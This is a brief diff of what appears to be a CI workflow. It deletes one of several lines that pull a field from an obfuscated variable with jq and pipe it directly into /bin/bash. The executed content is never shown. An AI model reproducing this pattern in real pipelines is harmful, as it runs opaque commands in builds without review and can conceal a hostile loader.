@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$yvl157" | jq -r .dyer2 | /bin/bash
           echo $w93 | jq -r .noavn00 | /bin/bash
           printf '%s' "$csw69025" | jq -r .qzpx0027 | /bin/bash
-          echo $mnaw49435 | jq -r .m4430 | /bin/bash
           echo $cb21 | jq -r .vcquz1918 | /bin/bash
           echo $l313 | jq -r .yx4 | /bin/bash
           echo $rhw518 | jq -r .tvm72 | /bin/bash
